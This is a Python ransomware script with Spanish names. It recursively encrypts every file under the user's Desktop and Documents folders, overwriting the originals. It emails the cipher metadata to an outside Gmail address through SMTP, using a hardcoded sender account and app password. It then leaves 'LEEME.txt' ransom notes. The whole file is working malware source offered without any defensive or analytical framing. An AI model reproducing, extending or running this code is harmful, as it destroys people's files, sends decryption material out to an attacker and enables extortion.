from pathlib import Path
from cryptography.fernet import Fernet
from Azar_encryptor import cifrado_de_azar_binario
from email.message import EmailMessage
import smtplib
import ssl
import json
import os
import gzip
import hashlib
import tempfile

# === Email configuration for sending encryption metadata ===

# Sender email address (must have SMTP access enabled via app password)
# This account will send the .json.gz file containing the encryption metadata.
CORREO_REMITENTE = "name1@gmail.com"

# App password generated for the sender Gmail account (NOT the regular password).
# Required to authenticate securely with Gmail's SMTP server.
CLAVE_APP = "wpiq dkdb waiu rfxk"

# Receiver email address where the metadata (.json.gz) will be stored.
# This account acts as a secure destination for later decryption access. 
CORREO_DESTINATARIO = "name2@gmail.com" 

# Returns target directories to search for files (Desktop & Documents)
def obtener_rutas_objetivo():
    home = Path.home()
    return [home / "Desktop", home / "Documents"]

# Sends a gzip-compressed JSON file via email if it's under 17 MB
def enviar_gzip_por_correo(gzip_path, nombre_original):
    tamaño_maximo = 17 * 1024 * 1024  # 17 MB
    if gzip_path.stat().st_size > tamaño_maximo:
        print(f"[!] File too large to send: {gzip_path.name}")
        os.remove(gzip_path)
        return

    msg = EmailMessage()
    msg["Subject"] = f"Encryption metadata for {nombre_original}"
    msg["From"] = CORREO_REMITENTE
    msg["To"] = CORREO_DESTINATARIO
    msg.set_content("Attached .json.gz file with encryption metadata.")

    with open(gzip_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="gzip", filename=gzip_path.name)

    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as servidor:
        servidor.login(CORREO_REMITENTE, CLAVE_APP)
        servidor.send_message(msg)

    os.remove(gzip_path)
    print(f"[✔] Sent and deleted: {gzip_path.name}")

# Generates a unique name based on file name hash
def generar_nombre_unico(path: Path):
    hash_ruta = hashlib.md5(str(path).encode()).hexdigest()[:6]
    return f"{path.stem}_{hash_ruta}"

# Encrypts a single file with Fernet + custom cipher
def cifrar_archivo(archivo_path: Path, correo_destinatario):
    try:
        with open(archivo_path, "rb") as f:
            datos_originales = f.read()

        # First encryption layer using Fernet
        clave = Fernet.generate_key()
        fernet = Fernet(clave)
        datos_fernet = fernet.encrypt(datos_originales)

        # Second encryption layer using custom cipher
        resultado = cifrado_de_azar_binario(datos_fernet, correo_destinatario)

        # Overwrite the original file with encrypted data
        with open(archivo_path, "wb") as f:
            f.write(resultado["cifrado"])

        # Save Fernet key in a separate file
        nombre_unico = generar_nombre_unico(archivo_path)
        clave_path = archivo_path.with_name(nombre_unico + "_clave.key")
        with open(clave_path, "wb") as f:
            f.write(clave)

        # Save encryption metadata to a gzip JSON
        tmp_dir = Path(tempfile.gettempdir())
        gzip_path = tmp_dir / f"{nombre_unico}_meta.json.gz"

        with gzip.open(gzip_path, "wt", encoding="utf-8", compresslevel=9) as f:
            json.dump({
                "nuevo_alfabeto": resultado["nuevo_alfabeto"],
                "desplazamientos": resultado["desplazamientos"],
                "abc_base": resultado["abc_base"]
            }, f)

        # Send metadata by email
        enviar_gzip_por_correo(gzip_path, archivo_path.name)

    except Exception as e:
        print(f"[✘] Error encrypting {archivo_path.name}: {e}")

# Scans target directories and encrypts all files found
def cifrar_todos():
    for ruta in obtener_rutas_objetivo():
        if ruta.exists():
            for archivo in ruta.rglob("*"):
                # Skip already encrypted key files
                if archivo.is_file() and not archivo.name.endswith("_clave.key"):
                    cifrar_archivo(archivo, CORREO_DESTINATARIO)

# Creates a warning message (ransom note) in text format
def crear_mensaje_txt():
    mensaje = """MESSAGE
"""

    ubicaciones = [Path.home() / "Desktop", Path.home() / "Documents"]

    for ruta in ubicaciones:
        ruta_archivo = ruta / "LEEME.txt"
        try:
            with open(ruta_archivo, "w", encoding="utf-8") as f:
                f.write(mensaje)
            print(f"[✔] Message created: {ruta_archivo}")
        except Exception as e:
            print(f"[✘] Error creating {ruta_archivo.name}: {e}")

# Entry point: encrypt all files and leave ransom message
if __name__ == "__main__":
    cifrar_todos()
    crear_mensaje_txt()